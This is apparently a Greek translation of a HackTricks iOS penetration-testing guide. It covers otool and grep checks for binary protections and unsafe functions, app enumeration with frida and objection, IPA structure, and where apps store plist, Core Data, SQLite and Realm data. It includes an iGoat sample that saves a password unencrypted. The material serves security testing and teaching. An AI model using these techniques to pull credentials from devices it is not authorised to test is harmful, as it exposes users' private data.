# iOS Pentesting

{{#include ../../banners/hacktricks-training.md}}

## iOS Βασικά

{{#ref}}
ios-basics.md
{{#endref}}

## Περιβάλλον Δοκιμών

Σε αυτή τη σελίδα μπορείτε να βρείτε πληροφορίες σχετικά με τον **iOS simulator**, **emulators** και **jailbreaking:**

{{#ref}}
ios-testing-environment.md
{{#endref}}

## Αρχική Ανάλυση

### Βασικές Λειτουργίες Δοκιμών iOS

Κατά τη διάρκεια της δοκιμής **θα προταθούν αρκετές λειτουργίες** (σύνδεση στη συσκευή, ανάγνωση/γραφή/ανέβασμα/κατέβασμα αρχείων, χρήση κάποιων εργαλείων...). Επομένως, αν δεν ξέρετε πώς να εκτελέσετε καμία από αυτές τις ενέργειες, παρακαλώ, **ξεκινήστε να διαβάζετε τη σελίδα**:

{{#ref}}
basic-ios-testing-operations.md
{{#endref}}

> [!NOTE]
> Για τα επόμενα βήματα **η εφαρμογή θα πρέπει να είναι εγκατεστημένη** στη συσκευή και θα πρέπει να έχει ήδη αποκτήσει το **IPA αρχείο** της εφαρμογής.\
> Διαβάστε τη σελίδα [Basic iOS Testing Operations](basic-ios-testing-operations.md) για να μάθετε πώς να το κάνετε αυτό.

### Βασική Στατική Ανάλυση

Ορισμένοι ενδιαφέροντες αποσυμπιεστές αρχείων iOS - IPA:

- https://github.com/LaurieWired/Malimite
- https://ghidra-sre.org/

Συνιστάται να χρησιμοποιήσετε το εργαλείο [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) για να εκτελέσετε μια αυτόματη Στατική Ανάλυση στο IPA αρχείο.

Αναγνώριση των **προστασιών που υπάρχουν στο δυαδικό**:

- **PIE (Position Independent Executable)**: Όταν είναι ενεργοποιημένο, η εφαρμογή φορτώνεται σε μια τυχαία διεύθυνση μνήμης κάθε φορά που εκκινείται, καθιστώντας πιο δύσκολη την πρόβλεψη της αρχικής διεύθυνσης μνήμης.

```bash
otool -hv <app-binary> | grep PIE   # Θα πρέπει να περιλαμβάνει τη σημαία PIE
```

- **Stack Canaries**: Για να επικυρωθεί η ακεραιότητα της στοίβας, μια τιμή ‘canary’ τοποθετείται στη στοίβα πριν από την κλήση μιας συνάρτησης και επικυρώνεται ξανά μόλις η συνάρτηση ολοκληρωθεί.

```bash
otool -I -v <app-binary> | grep stack_chk   # Θα πρέπει να περιλαμβάνει τα σύμβολα: stack_chk_guard και stack_chk_fail
```

- **ARC (Automatic Reference Counting)**: Για να αποτραπούν κοινά σφάλματα διαφθοράς μνήμης

```bash
otool -I -v <app-binary> | grep objc_release   # Θα πρέπει να περιλαμβάνει το σύμβολο _objc_release
```

- **Κρυπτογραφημένο Δυαδικό**: Το δυαδικό θα πρέπει να είναι κρυπτογραφημένο

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # Το cryptid θα πρέπει να είναι 1
```

**Αναγνώριση Ευαίσθητων/Ανασφαλών Συναρτήσεων**

- **Αδύνατοι Αλγόριθμοι Χαρακτηρισμού**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Στο linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```

- **Ανασφαλείς Τυχαίες Συναρτήσεις**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Στο linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```

- **Ανασφαλής Συναρτήση ‘Malloc’**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_malloc"

# Στο linux
grep -iER "_malloc"
```

- **Ανασφαλείς και Ευάλωτες Συναρτήσεις**

```bash
# Στη συσκευή iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Στο linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Βασική Δυναμική Ανάλυση

Δείτε τη δυναμική ανάλυση που εκτελεί ο [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Θα χρειαστεί να πλοηγηθείτε μέσα από τις διάφορες προβολές και να αλληλεπιδράσετε μαζί τους, αλλά θα συνδέει αρκετές κλάσεις κατά την εκτέλεση άλλων ενεργειών και θα ετοιμάσει μια αναφορά μόλις ολοκληρώσετε.

### Καταγραφή Εγκατεστημένων Εφαρμογών

Χρησιμοποιήστε την εντολή `frida-ps -Uai` για να προσδιορίσετε τον **bundle identifier** των εγκατεστημένων εφαρμογών:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Βασική Αρίθμηση & Hooking

Μάθετε πώς να **αριθμείτε τα συστατικά της εφαρμογής** και πώς να **hookάρει εύκολα μεθόδους και κλάσεις** με το objection:

{{#ref}}
ios-hooking-with-objection.md
{{#endref}}

### Δομή IPA

Η δομή ενός **IPA αρχείου** είναι ουσιαστικά αυτή ενός **συμπιεσμένου πακέτου**. Με την αλλαγή της επέκτασής του σε `.zip`, μπορεί να **αποσυμπιεστεί** για να αποκαλύψει το περιεχόμενό του. Μέσα σε αυτή τη δομή, ένα **Bundle** αντιπροσωπεύει μια πλήρως συσκευασμένη εφαρμογή έτοιμη για εγκατάσταση. Μέσα, θα βρείτε έναν φάκελο με όνομα `<NAME>.app`, ο οποίος περιέχει τους πόρους της εφαρμογής.

- **`Info.plist`**: Αυτό το αρχείο περιέχει συγκεκριμένες λεπτομέρειες ρύθμισης της εφαρμογής.
- **`_CodeSignature/`**: Αυτός ο φάκελος περιλαμβάνει ένα plist αρχείο που περιέχει μια υπογραφή, διασφαλίζοντας την ακεραιότητα όλων των αρχείων στο bundle.
- **`Assets.car`**: Ένα συμπιεσμένο αρχείο που αποθηκεύει αρχεία πόρων όπως εικονίδια.
- **`Frameworks/`**: Αυτός ο φάκελος φιλοξενεί τις εγγενείς βιβλιοθήκες της εφαρμογής, οι οποίες μπορεί να είναι σε μορφή `.dylib` ή `.framework` αρχείων.
- **`PlugIns/`**: Αυτό μπορεί να περιλαμβάνει επεκτάσεις της εφαρμογής, γνωστές ως `.appex` αρχεία, αν και δεν είναι πάντα παρούσες. \* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Χρησιμοποιείται για να αποθηκεύει τα μόνιμα δεδομένα της εφαρμογής σας για offline χρήση, να αποθηκεύει προσωρινά δεδομένα και να προσθέτει λειτουργία undo στην εφαρμογή σας σε μία μόνο συσκευή. Για να συγχρονίσετε δεδομένα σε πολλές συσκευές σε έναν μόνο λογαριασμό iCloud, το Core Data αντικατοπτρίζει αυτόματα το σχήμα σας σε ένα CloudKit container.
- [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Το αρχείο `PkgInfo` είναι ένας εναλλακτικός τρόπος για να καθορίσετε τους τύπους και τους κωδικούς δημιουργού της εφαρμογής ή του bundle σας.
- **en.lproj, fr.proj, Base.lproj**: Είναι τα πακέτα γλώσσας που περιέχουν πόρους για αυτές τις συγκεκριμένες γλώσσες, και έναν προεπιλεγμένο πόρο σε περίπτωση που μια γλώσσα δεν υποστηρίζεται.
- **Ασφάλεια**: Ο φάκελος `_CodeSignature/` παίζει κρίσιμο ρόλο στην ασφάλεια της εφαρμογής επαληθεύοντας την ακεραιότητα όλων των συσκευασμένων αρχείων μέσω ψηφιακών υπογραφών.
- **Διαχείριση Πόρων**: Το αρχείο `Assets.car` χρησιμοποιεί συμπίεση για να διαχειρίζεται αποτελεσματικά τα γραφικά στοιχεία, κρίσιμο για τη βελτιστοποίηση της απόδοσης της εφαρμογής και τη μείωση του συνολικού της μεγέθους.
- **Frameworks και PlugIns**: Αυτοί οι φάκελοι υπογραμμίζουν τη μονάδα των εφαρμογών iOS, επιτρέποντας στους προγραμματιστές να συμπεριλαμβάνουν επαναχρησιμοποιήσιμες βιβλιοθήκες κώδικα (`Frameworks/`) και να επεκτείνουν τη λειτουργικότητα της εφαρμογής (`PlugIns/`).
- **Τοπικοποίηση**: Η δομή υποστηρίζει πολλές γλώσσες, διευκολύνοντας την παγκόσμια εμβέλεια της εφαρμογής περιλαμβάνοντας πόρους για συγκεκριμένα πακέτα γλώσσας.

**Info.plist**

Το **Info.plist** χρησιμεύει ως θεμέλιο για τις εφαρμογές iOS, περιλαμβάνοντας βασικά δεδομένα ρύθμισης με τη μορφή **ζευγών κλειδιού-τιμής**. Αυτό το αρχείο είναι απαραίτητο όχι μόνο για τις εφαρμογές αλλά και για τις επεκτάσεις εφαρμογών και τα frameworks που περιλαμβάνονται. Είναι δομημένο είτε σε XML είτε σε δυαδική μορφή και περιέχει κρίσιμες πληροφορίες που κυμαίνονται από άδειες εφαρμογής έως ρυθμίσεις ασφαλείας. Για μια λεπτομερή εξερεύνηση των διαθέσιμων κλειδιών, μπορείτε να ανατρέξετε στην [**Τεκμηρίωση Προγραμματιστών της Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

Για όσους επιθυμούν να εργαστούν με αυτό το αρχείο σε μια πιο προσβάσιμη μορφή, η μετατροπή σε XML μπορεί να επιτευχθεί εύκολα μέσω της χρήσης του `plutil` σε macOS (διαθέσιμο εγγενώς σε εκδόσεις 10.2 και μεταγενέστερες) ή `plistutil` σε Linux. Οι εντολές για τη μετατροπή είναι οι εξής:

- **Για macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Για Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Ανάμεσα στην πληθώρα πληροφοριών που μπορεί να αποκαλύψει το αρχείο **Info.plist**, οι σημαντικές καταχωρήσεις περιλαμβάνουν τις συμβολοσειρές αδειών εφαρμογής (`UsageDescription`), τα προσαρμοσμένα URL schemes (`CFBundleURLTypes`), και τις ρυθμίσεις για την Ασφάλεια Μεταφοράς Εφαρμογών (`NSAppTransportSecurity`). Αυτές οι καταχωρήσεις, μαζί με άλλες όπως οι εξαγόμενοι/εισαγόμενοι τύποι εγγράφων (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), μπορούν να εντοπιστούν εύκολα με την επιθεώρηση του αρχείου ή χρησιμοποιώντας μια απλή εντολή `grep`:
```bash
$ grep -i <keyword> Info.plist
```
**Διαδρομές Δεδομένων**

Στο περιβάλλον iOS, οι καταλόγοι προορίζονται συγκεκριμένα για **συστήματα εφαρμογών** και **εφαρμογές που έχουν εγκατασταθεί από τον χρήστη**. Οι εφαρμογές συστήματος βρίσκονται στον κατάλογο `/Applications`, ενώ οι εφαρμογές που έχουν εγκατασταθεί από τον χρήστη τοποθετούνται κάτω από `/var/mobile/containers/Data/Application/`. Αυτές οι εφαρμογές έχουν ανατεθεί μια μοναδική ταυτότητα γνωστή ως **128-bit UUID**, καθιστώντας την εργασία της χειροκίνητης εύρεσης του φακέλου μιας εφαρμογής δύσκολη λόγω της τυχαιότητας των ονομάτων των καταλόγων.

> [!WARNING]
> Καθώς οι εφαρμογές στο iOS πρέπει να είναι sandboxed, κάθε εφαρμογή θα έχει επίσης έναν φάκελο μέσα στο **`$HOME/Library/Containers`** με το **`CFBundleIdentifier`** της εφαρμογής ως το όνομα του φακέλου.
>
> Ωστόσο, και οι δύο φάκελοι (φάκελοι δεδομένων & κοντέινερ) έχουν το αρχείο **`.com.apple.mobile_container_manager.metadata.plist`** που συνδέει και τα δύο αρχεία στην κλειδί `MCMetadataIdentifier`).

Για να διευκολυνθεί η ανακάλυψη του καταλόγου εγκατάστασης μιας εφαρμογής που έχει εγκατασταθεί από τον χρήστη, το **objection tool** παρέχει μια χρήσιμη εντολή, `env`. Αυτή η εντολή αποκαλύπτει λεπτομερείς πληροφορίες καταλόγου για την εφαρμογή σε ερώτηση. Παρακάτω είναι ένα παράδειγμα του πώς να χρησιμοποιήσετε αυτήν την εντολή:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Εναλλακτικά, το όνομα της εφαρμογής μπορεί να αναζητηθεί μέσα στον `/private/var/containers` χρησιμοποιώντας την εντολή `find`:
```bash
find /private/var/containers -name "Progname*"
```
Οι εντολές όπως `ps` και `lsof` μπορούν επίσης να χρησιμοποιηθούν για να εντοπίσουν τη διαδικασία της εφαρμογής και να καταγράψουν τα ανοιχτά αρχεία, αντίστοιχα, παρέχοντας πληροφορίες σχετικά με τις ενεργές διαδρομές καταλόγων της εφαρμογής:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Διεύθυνση πακέτου:**

- **AppName.app**
- Αυτό είναι το Application Bundle όπως έχει δει προηγουμένως στο IPA, περιέχει βασικά δεδομένα εφαρμογής, στατικό περιεχόμενο καθώς και το μεταγλωττισμένο δυαδικό της εφαρμογής.
- Αυτή η διεύθυνση είναι ορατή στους χρήστες, αλλά **οι χρήστες δεν μπορούν να γράψουν σε αυτήν**.
- Το περιεχόμενο σε αυτή τη διεύθυνση **δεν είναι αντίγραφο ασφαλείας**.
- Τα περιεχόμενα αυτού του φακέλου χρησιμοποιούνται για **επικύρωση της υπογραφής κώδικα**.

**Διεύθυνση δεδομένων:**

- **Documents/**
- Περιέχει όλα τα δεδομένα που δημιουργούνται από τον χρήστη. Ο τελικός χρήστης της εφαρμογής ξεκινά τη δημιουργία αυτών των δεδομένων.
- Ορατή στους χρήστες και **οι χρήστες μπορούν να γράψουν σε αυτήν**.
- Το περιεχόμενο σε αυτή τη διεύθυνση **είναι αντίγραφο ασφαλείας**.
- Η εφαρμογή μπορεί να απενεργοποιήσει διαδρομές ορίζοντας το `NSURLIsExcludedFromBackupKey`.
- **Library/**
- Περιέχει όλα τα **αρχεία που δεν είναι συγκεκριμένα για τον χρήστη**, όπως **caches**, **προτιμήσεις**, **cookies**, και αρχεία διαμόρφωσης λίστας ιδιοτήτων (plist).
- Οι εφαρμογές iOS συνήθως χρησιμοποιούν τους υποφακέλους `Application Support` και `Caches`, αλλά η εφαρμογή μπορεί να δημιουργήσει προσαρμοσμένους υποφακέλους.
- **Library/Caches/**
- Περιέχει **ημι-μόνιμα αρχεία cache.**
- Αόρατη στους χρήστες και **οι χρήστες δεν μπορούν να γράψουν σε αυτήν**.
- Το περιεχόμενο σε αυτή τη διεύθυνση **δεν είναι αντίγραφο ασφαλείας**.
- Το OS μπορεί να διαγράψει αυτόματα τα αρχεία αυτής της διεύθυνσης όταν η εφαρμογή δεν εκτελείται και ο χώρος αποθήκευσης είναι περιορισμένος.
- **Library/Application Support/**
- Περιέχει **μόνιμα** **αρχεία** απαραίτητα για τη λειτουργία της εφαρμογής.
- **Αόρατη** **στους** **χρήστες** και οι χρήστες δεν μπορούν να γράψουν σε αυτήν.
- Το περιεχόμενο σε αυτή τη διεύθυνση **είναι αντίγραφο ασφαλείας**.
- Η εφαρμογή μπορεί να απενεργοποιήσει διαδρομές ορίζοντας το `NSURLIsExcludedFromBackupKey`.
- **Library/Preferences/**
- Χρησιμοποιείται για την αποθήκευση ιδιοτήτων που μπορούν να **διατηρηθούν ακόμη και μετά την επανεκκίνηση μιας εφαρμογής**.
- Οι πληροφορίες αποθηκεύονται, μη κρυπτογραφημένες, μέσα στο sandbox της εφαρμογής σε ένα αρχείο plist που ονομάζεται \[BUNDLE_ID].plist.
- Όλα τα ζεύγη κλειδιού/τιμής που αποθηκεύονται χρησιμοποιώντας το `NSUserDefaults` μπορούν να βρεθούν σε αυτό το αρχείο.
- **tmp/**
- Χρησιμοποιήστε αυτή τη διεύθυνση για να γράψετε **προσωρινά αρχεία** που δεν χρειάζεται να διατηρηθούν μεταξύ των εκκινήσεων της εφαρμογής.
- Περιέχει μη μόνιμα αρχεία cache.
- **Αόρατη** στους χρήστες.
- Το περιεχόμενο σε αυτή τη διεύθυνση δεν είναι αντίγραφο ασφαλείας.
- Το OS μπορεί να διαγράψει αυτόματα τα αρχεία αυτής της διεύθυνσης όταν η εφαρμογή δεν εκτελείται και ο χώρος αποθήκευσης είναι περιορισμένος.

Ας ρίξουμε μια πιο προσεκτική ματιά στο Application Bundle (.app) της iGoat-Swift μέσα στη διεύθυνση πακέτου (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Αντίστροφη Μηχανική Δυαδικών

Μέσα στον φάκελο `<application-name>.app` θα βρείτε ένα δυαδικό αρχείο που ονομάζεται `<application-name>`. Αυτό είναι το αρχείο που θα **εκτελείται**. Μπορείτε να εκτελέσετε μια βασική επιθεώρηση του δυαδικού με το εργαλείο **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Ελέγξτε αν η εφαρμογή είναι κρυπτογραφημένη**

Δείτε αν υπάρχει κάποια έξοδος για:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Αποσυναρμολόγηση του δυαδικού αρχείου**

Αποσυναρμολόγηση της ενότητας κειμένου:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Για να εκτυπώσετε το **Objective-C segment** της δείγμα εφαρμογής, μπορείτε να χρησιμοποιήσετε:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Για να αποκτήσετε πιο συμπαγή κώδικα Objective-C μπορείτε να χρησιμοποιήσετε [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ωστόσο, οι καλύτερες επιλογές για την αποσυναρμολόγηση του δυαδικού είναι: [**Hopper**](https://www.hopperapp.com/download.html?) και [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

## Αποθήκευση Δεδομένων

Για να μάθετε πώς το iOS αποθηκεύει δεδομένα στη συσκευή, διαβάστε αυτή τη σελίδα:

{{#ref}}
ios-basics.md
{{#endref}}

> [!WARNING]
> Οι παρακάτω χώροι αποθήκευσης πληροφοριών θα πρέπει να ελέγχονται **αμέσως μετά την εγκατάσταση της εφαρμογής**, **μετά τον έλεγχο όλων των λειτουργιών** της εφαρμογής και ακόμη και μετά **την αποσύνδεση από έναν χρήστη και την είσοδο σε έναν διαφορετικό**.\
> Ο στόχος είναι να βρείτε **μη προστατευμένες ευαίσθητες πληροφορίες** της εφαρμογής (κωδικούς πρόσβασης, tokens), του τρέχοντος χρήστη και προηγούμενων συνδεδεμένων χρηστών.

### Plist

Τα **plist** αρχεία είναι δομημένα XML αρχεία που **περιέχουν ζεύγη κλειδιού-τιμής**. Είναι ένας τρόπος αποθήκευσης μόνιμων δεδομένων, οπότε μερικές φορές μπορεί να βρείτε **ευαίσθητες πληροφορίες σε αυτά τα αρχεία**. Συνιστάται να ελέγξετε αυτά τα αρχεία μετά την εγκατάσταση της εφαρμογής και μετά τη χρήση της εντατικά για να δείτε αν έχουν γραφτεί νέα δεδομένα.

Ο πιο κοινός τρόπος για να διατηρήσετε δεδομένα σε αρχεία plist είναι μέσω της χρήσης του **NSUserDefaults**. Αυτό το αρχείο plist αποθηκεύεται μέσα στο sandbox της εφαρμογής στο **`Library/Preferences/<appBundleID>.plist`**

Η κλάση [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) παρέχει μια προγραμματιστική διεπαφή για την αλληλεπίδραση με το προεπιλεγμένο σύστημα. Το προεπιλεγμένο σύστημα επιτρέπει σε μια εφαρμογή να προσαρμόσει τη συμπεριφορά της σύμφωνα με τις **προτιμήσεις του χρήστη**. Τα δεδομένα που αποθηκεύονται από το `NSUserDefaults` μπορούν να προβληθούν στο πακέτο της εφαρμογής. Αυτή η κλάση αποθηκεύει **δεδομένα** σε ένα **plist** **αρχείο**, αλλά προορίζεται να χρησιμοποιείται με μικρές ποσότητες δεδομένων.

Αυτά τα δεδομένα δεν μπορούν πλέον να προσπελαστούν άμεσα μέσω ενός αξιόπιστου υπολογιστή, αλλά μπορούν να προσπελαστούν εκτελώντας ένα **backup**.

Μπορείτε να **dump** τις πληροφορίες που αποθηκεύονται χρησιμοποιώντας το **`NSUserDefaults`** με την εντολή `ios nsuserdefaults get` του objection.

Για να βρείτε όλα τα plist που χρησιμοποιούνται από την εφαρμογή, μπορείτε να αποκτήσετε πρόσβαση στο `/private/var/mobile/Containers/Data/Application/{APPID}` και να εκτελέσετε:
```bash
find ./ -name "*.plist"
```
Για να μετατρέψετε αρχεία από **XML ή δυαδική (bplist)** μορφή σε XML, διατίθενται διάφορες μέθοδοι ανάλογα με το λειτουργικό σας σύστημα:

**Για χρήστες macOS:** Χρησιμοποιήστε την εντολή `plutil`. Είναι ένα ενσωματωμένο εργαλείο στο macOS (10.2+), σχεδιασμένο για αυτόν τον σκοπό:
```bash
$ plutil -convert xml1 Info.plist
```
**Για Χρήστες Linux:** Εγκαταστήστε πρώτα το `libplist-utils`, στη συνέχεια χρησιμοποιήστε το `plistutil` για να μετατρέψετε το αρχείο σας:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Μέσα σε μια συνεδρία Objection:** Για την ανάλυση κινητών εφαρμογών, μια συγκεκριμένη εντολή σας επιτρέπει να μετατρέψετε τα αρχεία plist απευθείας:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) είναι ένα πλαίσιο για τη διαχείριση της μοντελοποιημένης στρώσης αντικειμένων στην εφαρμογή σας. [Το Core Data μπορεί να χρησιμοποιήσει το SQLite ως μόνιμο αποθηκευτικό χώρο](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), αλλά το ίδιο το πλαίσιο δεν είναι μια βάση δεδομένων.\
Το CoreData δεν κρυπτογραφεί τα δεδομένα του από προεπιλογή. Ωστόσο, μπορεί να προστεθεί μια επιπλέον στρώση κρυπτογράφησης στο CoreData. Δείτε το [GitHub Repo](https://github.com/project-imas/encrypted-core-data) για περισσότερες λεπτομέρειες.

Μπορείτε να βρείτε τις πληροφορίες Core Data SQLite μιας εφαρμογής στη διαδρομή `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Εάν μπορείτε να ανοίξετε το SQLite και να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες, τότε έχετε βρει μια κακή ρύθμιση.**
```objectivec:Code from iGoat
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) είναι μια αποθήκη κλειδιού/τιμής που έχει κατασκευαστεί πάνω από το SQLite.\
Δεδομένου ότι οι βάσεις δεδομένων Yap είναι βάσεις δεδομένων sqlite, μπορείτε να τις βρείτε χρησιμοποιώντας την προτεινόμενη εντολή στην προηγούμενη ενότητα.

### Άλλες Βάσεις Δεδομένων SQLite

Είναι συνηθισμένο για τις εφαρμογές να δημιουργούν τη δική τους βάση δεδομένων sqlite. Μπορεί να **αποθηκεύουν** **ευαίσθητα** **δεδομένα** σε αυτές και να τα αφήνουν μη κρυπτογραφημένα. Επομένως, είναι πάντα ενδιαφέρον να ελέγχετε κάθε βάση δεδομένων μέσα στον κατάλογο των εφαρμογών. Επομένως, πηγαίνετε στον κατάλογο της εφαρμογής όπου αποθηκεύονται τα δεδομένα (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

Οι προγραμματιστές έχουν τη δυνατότητα να **αποθηκεύουν και να συγχρονίζουν δεδομένα** μέσα σε μια **NoSQL cloud-hosted database** μέσω των Firebase Real-Time Databases. Αποθηκευμένα σε μορφή JSON, τα δεδομένα συγχρονίζονται σε όλους τους συνδεδεμένους πελάτες σε πραγματικό χρόνο.

Μπορείτε να βρείτε πώς να ελέγξετε για κακώς διαμορφωμένες βάσεις δεδομένων Firebase εδώ:

{{#ref}}
../../network-services-pentesting/pentesting-web/buckets/firebase-database.md
{{#endref}}

### Realm databases

[Realm Objective-C](https://realm.io/docs/objc/latest/) και [Realm Swift](https://realm.io/docs/swift/latest/) προσφέρουν μια ισχυρή εναλλακτική για την αποθήκευση δεδομένων, που δεν παρέχεται από την Apple. Από προεπιλογή, **αποθηκεύουν δεδομένα χωρίς κρυπτογράφηση**, με κρυπτογράφηση διαθέσιμη μέσω συγκεκριμένης διαμόρφωσης.

Οι βάσεις δεδομένων βρίσκονται στη διεύθυνση: `/private/var/mobile/Containers/Data/Application/{APPID}`. Για να εξερευνήσετε αυτά τα αρχεία, μπορείτε να χρησιμοποιήσετε εντολές όπως:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Για την προβολή αυτών των αρχείων βάσης δεδομένων, προτείνεται το εργαλείο [**Realm Studio**](https://github.com/realm/realm-studio).

Για την υλοποίηση κρυπτογράφησης μέσα σε μια βάση δεδομένων Realm, μπορεί να χρησιμοποιηθεί το παρακάτω απόσπασμα κώδικα:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite Databases

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) περιγράφεται ως μια **ελαφριά** και **ενσωματωμένη** μηχανή βάσης δεδομένων που ακολουθεί την προσέγγιση **προσανατολισμένη σε έγγραφα** (NoSQL). Σχεδιασμένη να είναι εγγενής για **iOS** και **macOS**, προσφέρει τη δυνατότητα συγχρονισμού δεδομένων χωρίς προβλήματα.

